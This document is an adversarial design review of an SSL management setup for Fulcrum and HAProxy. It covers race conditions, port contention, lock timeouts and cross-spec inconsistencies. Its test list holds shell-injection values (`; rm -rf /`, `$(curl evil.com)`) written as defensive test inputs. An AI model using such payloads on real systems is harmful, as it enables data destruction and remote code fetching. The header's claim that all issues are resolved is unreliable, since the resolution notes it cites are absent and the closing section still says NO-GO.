# Steelman Review: SSL Management Architecture

**Reviewer:** Adversarial Architecture Review
**Date:** 2026-03-30
**Documents Reviewed:**
1. `SSL_MANAGEMENT_ARCHITECTURE.md` (Architecture)
2. `REGISTRATION_API_SPEC.md` (HAProxy Registration API)
3. `FULCRUM_SSL_INTEGRATION_SPEC.md` (Fulcrum Integration)
4. `TESTING_INSTRUCTIONS.md` (Testing Plan)

**Verdict: ~~NO-GO -- 6 critical issues must be resolved before implementation.~~**

**UPDATED 2026-03-30: All 6 critical issues, 7 important issues, and 11 consistency gaps have been resolved. All four documents have been reconciled to use canonical values. See resolution notes below each issue.**

**Updated Verdict: GO — All critical and important issues resolved. Minor issues documented as known limitations.**

---

## 1. Executive Summary -- Top 5 Most Critical Issues

1. **Contradictory SSL failure behavior will cause production outages or silent security degradation.** The Architecture spec says "fail fast, fail loud -- no silent fallback to non-SSL mode" (Section 1.3), but the Fulcrum Integration spec says ssl-setup failure causes "the entrypoint logs a warning and falls back to TCP-only mode" (Section 3). You cannot have both. Either SSL failure is fatal or it is not. The current spec ships a system that contradicts its own design principles.

2. **The nonce verification scheme has a fatal race condition with HAProxy.** The ssl-setup script starts a nonce server on port 80, registers with HAProxy, then curls the domain to verify reachability. But HAProxy needs to reload its config after registration (SIGUSR2, new workers spawning). Between registration and the curl, the new config may not be live yet. The nonce check will fail intermittently, causing ssl-setup to exit 10 on a perfectly valid setup.

3. **Certbot standalone mode and the nonce server fight over port 80.** The Architecture spec (Section 3.2) starts a nonce server on port 80 using `nc -l -p 80`, then certbot runs in standalone mode which also binds port 80. The spec acknowledges this ("the nonce server from Step 1 must be stopped before certbot runs") but the pseudocode uses `nc` with a single-connection `-q 1` flag and a background PID kill. If the nonce verification fails and the `nc` process does not exit cleanly, certbot cannot bind port 80 and fails with a misleading "address already in use" error.

4. **No API process supervisor means the Registration API silently dies in production.** The HAProxy spec (Section 8.4) explicitly states: "The API is not automatically restarted" and calls it a "v1.1 enhancement." If the Python API crashes (unhandled exception, OOM kill, segfault in a native module), all subsequent container registrations, SSL setups, and certificate renewals that depend on HAProxy registration will fail. This is a single point of failure with no recovery mechanism.

5. **The file-lock-with-no-timeout design allows unbounded blocking.** The Registration API spec (Section 8.3) states the `fcntl.flock` on `domains.map` "has no timeout -- this is acceptable because the critical section takes under 2 seconds in practice." If `generate-config.sh` hangs (waiting on a stuck subprocess, disk I/O stall on a full volume, or a DNS timeout during HAProxy config validation), every subsequent API request blocks forever. With `ThreadingHTTPServer`, each blocked request holds a thread, and the server eventually runs out of threads. No health check will detect this because the health endpoint does not acquire the lock.

---

## 2. Critical Issues (MUST Fix Before Implementation)

### C-1: Contradictory Failure Semantics

**Location:** Architecture Section 1.3 vs. Fulcrum Integration Section 3 vs. Appendix B

The Architecture spec establishes a design principle: "If SSL is requested but cannot be established, the container exits with a non-zero code and a clear error message. No silent fallback to non-SSL mode."

The Fulcrum Integration spec directly contradicts this: "If SSL_DOMAIN was set but ssl-setup failed, the entrypoint logs a warning and falls back to TCP-only mode. This ensures the server remains reachable for debugging even if certificate acquisition fails."

The Appendix B pseudocode follows the fallback approach: `if rc != 0: log("WARNING..."), unset SSL_DOMAIN`.

**Impact:** An operator who sets `SSL_DOMAIN=electrum.example.com` expects SSL. If certbot hits rate limits (common in testing), the container silently degrades to unencrypted TCP. Electrum clients connecting to port 50001 send wallet data in cleartext. The operator has no indication unless they check logs.

**Fix:** Choose one behavior and enforce it consistently. Recommended: fail fast by default, add an explicit `SSL_FALLBACK_TCP=true` environment variable for operators who want degraded-mode availability. Document the security implications.

### C-2: Nonce Verification Race with HAProxy Reload

**Location:** Architecture Section 3.2 Step 1

The sequence is: (1) register HTTP backend with HAProxy, (2) start nonce server on port 80, (3) curl the domain through the public internet to verify the nonce comes back.

Between steps 1 and 3, HAProxy must receive the registration, call `generate-config.sh`, validate the config, send SIGUSR2 to the master, spawn new workers, and have those workers begin accepting connections. The Registration API spec (Section 5.1) describes this as a multi-step process including "old workers gracefully drain connections."

The nonce curl uses `--max-time 10`. But HAProxy reload under load can take longer than 10 seconds if old workers are draining. The nonce server uses `nc -l -p 80 -q 1` which accepts exactly one connection and then exits. If HAProxy sends a health check probe to port 80 before the nonce curl arrives, the nonce server is consumed by the health check and the actual verification gets nothing.

**Impact:** Intermittent ssl-setup failures in production, especially under load or on slow Docker hosts.

**Fix:**
- The Registration API should return only after the reload is confirmed (wait for new workers to be ready, not just SIGUSR2 sent).
- Replace the single-shot `nc` nonce server with a proper HTTP server (a 5-line Python snippet) that handles multiple requests and runs until explicitly stopped.
- Add a retry loop (3 attempts, 5 seconds apart) for the nonce verification.

### C-3: Port 80 Contention Between Nonce Server and Certbot

**Location:** Architecture Section 3.2 Steps 1-2

The pseudocode starts `nc -l -p 80` as a background process, curls it, kills it, then runs certbot standalone on port 80. The kill uses `kill $NONCE_PID 2>/dev/null`. If the nonce verification fails (the domain is unreachable), the script exits 10 without killing the nonce process. The `nc` process continues to hold port 80 as a zombie listener.

Even in the success path, there is a TOCTOU window: the script kills the nonce PID, but `nc` may have already exited (it exits after one connection with `-q 1`). The kill targets a PID that may have been reused. On a busy container with cron and other processes, PID reuse within milliseconds is possible.

**Impact:** Certbot fails with "address already in use" on port 80. The error message does not mention the nonce server, making debugging difficult.

**Fix:**
- Use a proper HTTP server instead of `nc`. Python's `http.server` can be started and stopped cleanly.
- Ensure cleanup on all exit paths using a trap handler.
- Verify port 80 is free before running certbot (add a pre-flight `ss -tlnp | grep :80` check).

### C-4: No API Process Supervisor

**Location:** Registration API Spec Section 3.4, Section 8.4

The HAProxy entrypoint starts the Python API in the background and then `exec`s into HAProxy. If the API process dies, nothing restarts it. The spec explicitly defers this to "v1.1."

**Impact:** After an API crash:
- New containers cannot register their domains.
- The ssl-setup script in Fulcrum containers will fail when trying to register with HAProxy (connection refused on 8404).
- Certificate renewals that require HAProxy re-registration will fail.
- The health check endpoint becomes unreachable, but no alerting is configured.
- The only recovery is `docker restart haproxy`, which causes a brief traffic disruption.

**Fix:** Wrap the API in a simple restart loop before the `exec haproxy`:

```bash
(while true; do
    python3 /usr/local/bin/registration-api.py ... || true
    echo "API crashed, restarting in 2s..." >&2
    sleep 2
done) &
exec haproxy -W -f "$CONF_DIR" -S /var/run/haproxy-master.sock
```

This is 4 lines of shell and eliminates the single point of failure.

### C-5: Unbounded File Lock in the Registration API

**Location:** Registration API Spec Section 8.3

The `fcntl.flock(LOCK_EX)` call has no timeout. The critical section includes shelling out to `generate-config.sh` and running `haproxy -c` for config validation. If either subprocess hangs:
- All subsequent API requests block indefinitely.
- The health check endpoint (which does NOT acquire the lock) continues to report "healthy," masking the deadlock.
- Docker's health check passes, so no container restart is triggered.
- The operator sees registration timeouts with no indication of the root cause.

**Impact:** A single stuck `generate-config.sh` invocation (disk full, DNS timeout, or even a template bug that causes infinite output) makes the entire registration API permanently unresponsive.

**Fix:**
- Add a timeout to the subprocess calls: `subprocess.run(..., timeout=30)`.
- Add a timeout to the file lock: use `fcntl.flock` with `LOCK_EX | LOCK_NB` in a polling loop with a maximum wait time.
- Make the health check endpoint report "degraded" if the lock has been held for more than 30 seconds.

### C-6: Supervisor Loop Does Not Distinguish Certificate Restart from Clean Shutdown

**Location:** Fulcrum Integration Spec Section 8, Architecture Spec Section 5.3

The certbot deploy hook sends SIGTERM to Fulcrum. The Integration spec (Section 8) says "Fulcrum exits cleanly (exit code 0)" and acknowledges the supervisor will NOT restart on clean exit. The proposed fix is a marker file `/tmp/.fulcrum-cert-restart`.

The Architecture spec (Section 5.3) uses a different marker file name: `/tmp/.ssl-renewal-restart`.

Two specs, two different file paths, same mechanism. If the implementation follows one spec but not the other, the restart-after-renewal feature silently breaks.

Additionally, the marker file approach has a race condition: if the system crashes between writing the marker file and sending SIGTERM, the next container restart will see a stale marker file and treat a normal startup as a cert-renewal restart. The marker file is on the container's ephemeral filesystem (not a volume), so this scenario requires the process to crash but the container to stay running -- which can happen with the supervisor loop.

**Impact:** After certificate renewal, Fulcrum either fails to restart (serving with old certs until the container restarts) or incorrectly skips crash recovery procedures.

**Fix:**
- Standardize on a single marker file path across all specs.
- Use SIGUSR1 (or another signal) instead of SIGTERM+marker-file. Add signal handling in the supervisor loop to distinguish "restart for cert renewal" from "graceful shutdown."
- If keeping the marker file, delete it unconditionally at the start of the supervisor loop iteration, not just when it is consumed.

---

## 3. Important Issues (SHOULD Fix)

### I-1: Domain Hijacking on haproxy-net

**Location:** Architecture Section 9.3, Registration API Section 10.2

Any container on `haproxy-net` can register any domain. A compromised or malicious container can register `electrum.example.com` before the legitimate Fulcrum container starts, routing all Electrum traffic to itself. The spec explicitly says "domain ownership is not verified."

The 409 Conflict response prevents overwriting an existing registration, but if the attacker registers first (or if the legitimate container is restarted and the attacker races the registration), the attacker wins.

**Fix:** Add an optional `HAPROXY_API_KEY` as a bearer token, delivered via environment variable. Even a simple shared secret significantly raises the bar for domain hijacking. This should be v1.0, not a future enhancement.

### I-2: No Rate Limiting on the Registration API

**Location:** Registration API Section 10.5

The spec acknowledges an attacker on `haproxy-net` could "register thousands of domains, bloating domains.map and HAProxy config" and defers mitigation to "v1.1." Each registration triggers `generate-config.sh` and a HAProxy reload. An attacker can:
- Register 10,000 domains in a loop, each triggering a full config regeneration and reload.
- Each reload spawns new HAProxy workers while old ones drain, consuming memory proportional to the number of pending reloads.
- With no debouncing, this causes an OOM kill of the HAProxy container.

**Fix:** Add a registration count limit (configurable, default 100) and a reload debounce (coalesce registrations within a 2-second window into a single reload).

### I-3: Renewal Cron Inconsistency

**Location:** Architecture Section 5.3 vs. Fulcrum Integration Section 8

The Architecture spec installs a cron job during image build that runs at a randomized minute `*/12` hours (twice daily). The Fulcrum Integration spec says the cron job runs "daily at 03:00 UTC" with a fixed schedule `0 3 * * *`. These are different schedules. The Architecture spec's approach (twice daily, randomized) is correct per certbot best practices.

**Fix:** Standardize on the Architecture spec's schedule (twice daily, randomized minute). Update the Integration spec.

### I-4: Fulcrum Does Not Hot-Reload Certificates

**Location:** Fulcrum Integration Section 8

Fulcrum reads SSL certificates at startup via Qt's `QSslCertificate` and holds them in memory. When certbot renews the cert on disk, Fulcrum continues serving with the old in-memory cert until restarted. The deploy hook sends SIGTERM to trigger a supervisor restart.

During the restart window (Fulcrum shutdown + database recovery + RPC reconnection), all Electrum clients are disconnected. For Alpha's SPV service, this can be 30-120 seconds of downtime every 60 days.

**Fix:** Document this downtime window explicitly in the operator documentation. Consider adding a `--reload-certs` command to FulcrumAdmin that triggers a Qt SSL context reload without full restart. This is a C++ change and may be out of scope for v1.0, but it should be tracked.

### I-5: HAProxy Config Paths Disagree Between Specs

**Location:** Architecture Section 4.1 vs. Registration API Section 3.2

The Architecture spec's docker-compose shows config at `/usr/local/etc/haproxy/conf.d` (stock HAProxy path). The Registration API spec uses `/etc/haproxy/conf.d` (custom path). The Registration API spec creates symlinks to bridge this gap, but the Architecture spec does not mention symlinks.

If the symlinks are not created, HAProxy cannot find its config files and fails to start.

**Fix:** Standardize on one path set. The Registration API spec's approach (custom paths with symlinks) is more robust. Add the symlink creation to the Architecture spec's Dockerfile.

### I-6: `https_port: 0` vs `https_port: null` Inconsistency

**Location:** Architecture Section 3.2 vs. Registration API Section 2.3.1

The ssl-setup script in the Architecture spec sends `"https_port": 0` to mean "HTTP only for now." The Registration API spec says `http_port` and `https_port` must be "integer 1-65535 when specified" and that `null` means "skip." Port 0 is invalid per the API spec's validation rules.

**Impact:** The first HAProxy registration from ssl-setup will be rejected with a 422 validation error, and ssl-setup will fail.

**Fix:** Change ssl-setup to send `"https_port": null` instead of `0`. Update the Architecture spec's pseudocode.

### I-7: Docker Compose Example Uses Wrong HAProxy Image

**Location:** Fulcrum Integration Section 11

The docker-compose example in the Integration spec uses `image: haproxy:2.9` (stock HAProxy). But the Registration API requires a custom-built image with the Python API embedded. This compose file will start a stock HAProxy with no registration API, and all ssl-setup registrations will fail.

**Fix:** Change the compose example to reference the custom-built HAProxy image.

---

## 4. Minor Issues

### M-1: Exit Code Inconsistency Across Specs

The Architecture spec defines exit codes 10 (domain unreachable), 11 (certbot failed), 12 (TLS verification failed), 13 (HAProxy registration failed), 14 (HAProxy reload failed). The Integration spec's Appendix A defines exit codes 0, 1, 2, 3 with different meanings. These are two completely different exit code schemes.

### M-2: `PEBBLE_VA_ALWAYS_VALID=1` Undermines Test Value

With `PEBBLE_VA_ALWAYS_VALID=1`, the mock ACME server accepts all challenges without actually checking port 80. This means the tests never validate that the HTTP-01 challenge flow actually works end-to-end through HAProxy. Set this to `0` for at least one test case that exercises the real challenge flow.

### M-3: No IPv6 Coverage

None of the specs mention IPv6. HAProxy, Docker networks, and Let's Encrypt all support IPv6. If the Docker host has IPv6 connectivity, HAProxy may receive AAAA-routed requests, but the backend resolution uses Docker's internal DNS which is IPv4 by default on bridge networks.

### M-4: No Wildcard Certificate Support

The specs only handle single-domain certificates. Wildcard certificates (`*.example.com`) require DNS-01 challenges, which require DNS provider API integration. This is a feature gap that should be documented as a known limitation.

### M-5: `SSL_TEST_MODE` Not Documented in Architecture Spec

The Testing Instructions reference `SSL_TEST_MODE` (self-signed cert fallback), but this variable does not appear in the Architecture spec's environment variable table or the Integration spec's env var table. If it is test-only, it should not be baked into the ssl-manager image. If it is production-facing, it needs to be documented.

### M-6: The Health Check Uses `nc -z localhost 50001` Which Passes Before SSL Setup

The Fulcrum Dockerfile's HEALTHCHECK checks if port 50001 is listening. But port 50001 is TCP (non-SSL). The health check passes as soon as Fulcrum starts, even if SSL setup is still running or has failed. There is no health check for the SSL port (50002).

### M-7: `--restart always` vs `--restart on-failure:5`

The Integration spec's run-fulcrum.sh uses `--restart always`, but the Architecture spec (Section 7.2) recommends `--restart on-failure:5`. With `--restart always`, a misconfigured container (wrong domain, bad DNS) will restart infinitely, potentially hitting Let's Encrypt rate limits even with the cert-exists check.

### M-8: Backup Strategy Not Addressed

No spec mentions how to back up the `/etc/letsencrypt` volume. If the volume is lost, the operator must request new certificates, potentially hitting rate limits. A backup strategy (periodic `docker run --rm -v fulcrum-letsencrypt:/data -v /backup:/backup alpine tar czf /backup/letsencrypt.tar.gz /data`) should be documented.

---

## 5. Consistency Matrix

| Parameter | Architecture Spec | Registration API Spec | Fulcrum Integration Spec | Testing Instructions |
|---|---|---|---|---|
| **HAProxy API Port** | 8404 | 8404 | 8404 | 8404 |
| **Registration Endpoint** | `POST /v1/backends` | `POST /v1/backends` | `POST /api/register` (mermaid diagram) | `POST /v1/backends` |
| **HAProxy Reload Signal** | SIGUSR2 | SIGUSR2 | Not specified | Not tested |
| **Config Path (HAProxy)** | `/usr/local/etc/haproxy/conf.d` | `/etc/haproxy/conf.d` (with symlinks) | `/usr/local/etc/haproxy/conf.d` (compose) | `/usr/local/etc/haproxy/conf.d` |
| **HAProxy Base Image** | `haproxy:lts` (Dockerfile) | `haproxy:lts` (Dockerfile) | `haproxy:2.9` (compose example) | `haproxy-api:test` (built from source) |
| **ssl-setup Exit Codes** | 10, 11, 12, 13, 14 | N/A | 0, 1, 2, 3 (Appendix A) | Not validated against codes |
| **SSL Failure Behavior** | Exit non-zero, no fallback | N/A | Fallback to TCP-only | Tests expect non-zero exit (Suite 6) |
| **Cert Renewal Schedule** | `$(shuf) */12 * * *` (twice daily) | N/A | `0 3 * * *` (once daily) | Not tested |
| **Marker File for Restart** | `/tmp/.ssl-renewal-restart` | N/A | `/tmp/.fulcrum-cert-restart` | Not tested |
| **https_port for "skip"** | `0` (in curl example) | `null` (API spec), 1-65535 range | Not specified | `443` (in all tests) |
| **Letsencrypt Volume Name** | `letsencrypt-data` | N/A | `fulcrum-letsencrypt` | Not specified |
| **DELETE Response Code** | Not specified | `204 No Content` | N/A | `204` |
| **POST Response (existing)** | Not specified | `200 OK` (idempotent) | N/A | `200` |
| **HAProxy Entrypoint** | Shell with `python3 ... &; haproxy -W -f` | Custom `entrypoint.sh` with trap, exec | Not specified | Built into `haproxy-api:test` image |
| **Port 80 HTTP Server** | `nc -l -p 80 -q 1` (nonce), certbot standalone | N/A | Persistent HTTP server for renewals (Section 8) | Not tested |
| **HAPROXY_HOST default** | `haproxy` (auto-detect) | N/A | `haproxy` | `haproxy-test` |
| **API Response Format** | `{"status": "created", ...}` | `{"domain": "...", "created_at": "..."}` (201) | N/A | `{"status": "registered"}` |
| **List Response Format** | Not specified | `{"backends": [...], "count": N}` | N/A | `[{...}]` (flat array) |

**Key inconsistencies highlighted in red (figuratively):**
- Registration endpoint path: `/v1/backends` vs `/api/register`
- Exit codes: two completely different schemes
- Failure behavior: fail-fast vs fallback
- Volume name: `letsencrypt-data` vs `fulcrum-letsencrypt`
- Marker file: two different paths
- Renewal schedule: twice daily vs once daily
- https_port skip value: `0` vs `null`
- API response format: three different schemas across three docs
- HAProxy config path: stock vs custom
- HAProxy base image version: `lts` vs `2.9`
- List backends response: wrapped object vs flat array

---

## 6. Missing Test Cases

### Race Conditions and Timing
- **T-RACE-1:** HAProxy restart during Fulcrum registration (start HAProxy, begin ssl-setup in Fulcrum, kill HAProxy mid-registration, verify ssl-setup handles the failure).
- **T-RACE-2:** Two containers registering the same domain simultaneously (parallel `curl POST` calls, verify exactly one gets 201 and the other gets 409).
- **T-RACE-3:** Registration API receives request while `generate-config.sh` is running (register domain A, immediately register domain B, verify both succeed without corrupting `domains.map`).
- **T-RACE-4:** Certbot renewal fires while container is shutting down (start ssl-test-service, trigger renewal, send SIGTERM simultaneously, verify no corruption).

### Failure Recovery
- **T-FAIL-1:** API process crash recovery (kill the Python API process inside the HAProxy container, verify API is unreachable, then verify HAProxy continues serving traffic).
- **T-FAIL-2:** Corrupt `domains.map` (write garbage to `domains.map`, call `POST /v1/reload`, verify HAProxy does not crash and the API returns 500 with a useful error).
- **T-FAIL-3:** Full disk (fill the haproxy-data volume, attempt a registration, verify the API returns 500 and HAProxy continues with existing config).
- **T-FAIL-4:** Let's Encrypt rate limit simulation (exhaust pebble's cert issuance in some way, verify ssl-setup fails with exit 11 and a clear message).

### Security
- **T-SEC-1:** Shell injection via domain name (register domain `; rm -rf /`, verify 422 response and no shell execution).
- **T-SEC-2:** Shell injection via container name (register container `$(curl evil.com)`, verify 422 response).
- **T-SEC-3:** API access from outside haproxy-net (attempt `curl http://localhost:8404/v1/backends` from the host when port 8404 is not published, verify connection refused).

### Certificate Lifecycle
- **T-CERT-1:** Certificate renewal triggers Fulcrum restart (mock a cert renewal via deploy hook, verify Fulcrum restarts and picks up new cert).
- **T-CERT-2:** Existing valid certificate is reused on container restart (start with SSL, stop container, start again, verify certbot is NOT called).
- **T-CERT-3:** Expired certificate triggers re-acquisition (create an expired cert in the letsencrypt volume, start container, verify certbot runs).

### Operational
- **T-OPS-1:** Domain rotation (change `SSL_DOMAIN` from `old.example.com` to `new.example.com` on the same container, verify old registration is cleaned up and new cert is obtained).
- **T-OPS-2:** Docker host reboot (stop all containers, start them in wrong order -- Fulcrum before HAProxy -- verify Fulcrum retries and eventually succeeds).
- **T-OPS-3:** Volume loss recovery (delete `fulcrum-letsencrypt` volume, restart container, verify it obtains a new certificate).

### Platform Compatibility
- **T-PLAT-1:** macOS Docker Desktop (Docker Desktop uses a Linux VM; verify that host port mappings and Docker DNS resolution work identically).
- **T-PLAT-2:** Podman compatibility (if relevant for the deployment target).

---

## 7. Recommended Changes

### For Critical Issues

| ID | Issue | Recommended Change |
|---|---|---|
| C-1 | Contradictory failure semantics | Add `SSL_REQUIRED` env var (default `false`). When `true`, ssl-setup failure is fatal. When `false`, fallback to TCP. Update Architecture Section 1.3 to remove the blanket "no fallback" statement. |
| C-2 | Nonce race with HAProxy reload | (a) Add 3-second sleep after registration before nonce check. (b) Replace `nc` with a Python HTTP server that handles multiple requests. (c) Add 3-attempt retry loop with 5s backoff. (d) Have the Registration API block until new workers are serving. |
| C-3 | Port 80 contention | Replace `nc` nonce server with `python3 -c "..."` HTTP server. Add trap handler to clean up on all exit paths. Add `ss -tlnp :80` pre-flight check before certbot. |
| C-4 | No API supervisor | Wrap API start in a `while true; do ...; sleep 2; done` loop in the entrypoint. This is 4 lines of shell. |
| C-5 | Unbounded file lock | Add `timeout=30` to `subprocess.run()` calls. Use `LOCK_NB` with polling and a 60-second maximum wait. Add lock-held duration to health check response. |
| C-6 | Marker file inconsistency | Standardize on `/tmp/.ssl-renewal-restart` across all specs. Delete marker at the top of each supervisor iteration. Consider using a dedicated signal (SIGUSR1) instead. |

### For Important Issues

| ID | Issue | Recommended Change |
|---|---|---|
| I-1 | Domain hijacking | Add `HAPROXY_API_KEY` env var checked as `Authorization: Bearer <key>` header. Optional but strongly recommended. |
| I-2 | No rate limiting | Add `MAX_REGISTRATIONS=100` and reload debounce (2s coalesce window). |
| I-3 | Cron inconsistency | Standardize on twice-daily randomized schedule from Architecture spec. |
| I-5 | Config path disagreement | Add symlink creation to Architecture spec Dockerfile. |
| I-6 | `https_port: 0` vs `null` | Change ssl-setup to send `null`. Update pseudocode. |
| I-7 | Wrong HAProxy image in compose | Change `haproxy:2.9` to the custom-built image reference. |

---

## 8. Approval Status

**NO-GO.**

Six critical issues were found. The most severe are the contradictory failure semantics (C-1), the nonce verification race condition (C-2), and the lack of API process supervision (C-4). These will cause production failures that are difficult to diagnose.

The consistency matrix reveals 11 disagreements between the four specs on fundamental parameters (exit codes, response formats, file paths, port values). Implementing from these specs without reconciliation will produce a system where the components do not interoperate.

**To reach GO status:**
1. Resolve all 6 critical issues.
2. Reconcile the consistency matrix -- pick one value for each parameter and update all four documents.
3. Add test cases T-RACE-1 through T-RACE-4 and T-FAIL-1 through T-FAIL-3 to the testing plan.
4. Add the API supervisor restart loop (C-4 fix) -- this is 4 lines of shell and eliminates the biggest operational risk.

The architecture is sound in its overall design. The separation between ssl-manager base image, HAProxy registration API, and Fulcrum integration layer is clean. The use of certbot standalone mode with HAProxy passthrough is the right approach. The problems are in the details -- cross-document inconsistencies, unhandled race conditions, and missing operational safeguards. These are fixable without architectural changes.
